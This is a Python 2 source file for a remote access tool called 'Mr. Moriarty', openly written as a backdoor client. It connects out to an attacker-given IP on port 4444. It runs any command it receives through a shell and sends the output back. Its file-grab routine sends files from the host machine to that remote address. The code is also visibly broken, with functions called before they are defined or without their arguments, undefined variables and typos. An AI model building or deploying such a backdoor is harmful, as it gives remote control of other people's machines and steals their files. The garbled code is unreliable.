#Basic TCP Client
#MR.MORIARTY
#Author SN0WD0X
import socket
import sys
import subprocess #To execute shell commands
import datetime
from Crypto.Cipher import AES

today = datetime.date.today()
print 'DATE: ', today

print 'Usage: python Moriaty.py ipaddress port'

cli_ip = sys.argv[1]
cli_port = 4444
#cli_ip = ''
#cli_port = 1234

def connect():
	try:
		soc = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
		soc.connect((cli_ip,cli_port)) #the ip of the server and the listening port

	except:
		print 'FAILED TO CONNECT!'

	while True:
		try:
			cmd = soc.recv(2048) #reading the first KB of the tcp socket :)
			#response = cmd.split('\0', 1)[0].strip()
			#print(response)
			if 'terminate' in cmd:
				soc.close() # close the connection
				break

			else:
				command = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				soc.send(command.stdout.read()) # sending the result back
				soc.send(command.stderr.read()) #sending the error back eg-: syntax errors

		except:
			print 'FAILED TO SEND THE COMMANDS!'

def encrypt(cmd):
	encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
	return encrypto.encrypt(cmd)

def decrypt(cmd):
	decrpto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
	return decrypto.decrypt(cmd)


def main():
	connect()
	transfer()
	grab_file()
	decrypt()
	encrypt()
main()

def transfer(soc,path):
	try:
		if os.path.exists(path):
			f = open(path, 'rb')
			pkt = f.read(2048)
			while pkt != '':
				soc.send(pkt)
				pkt = f.read(2048)
			soc.send('DONE')
			f.close()
		else:
			soc.send('FILE NOT FOUD') #life sucks
	except:
		print 'RETRY AGAIN!'
def grab_file(f,path):
	while True:
		try:
			command =  soc.recv(2048)
			if 'terminate' in cmd:
				soc.close() # close the connection
				break
			elif 'grab' in command:
				grab, path = command.split('*')
				transfer(soc.path)
		except Exception,e:
			soc.send( str(e))
			pass

		else:

			command = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			soc.send(command.stdout.read()) # sending the result back
			soc.send(command.stderr.read()) #sending the error back eg-: syntax errors


			


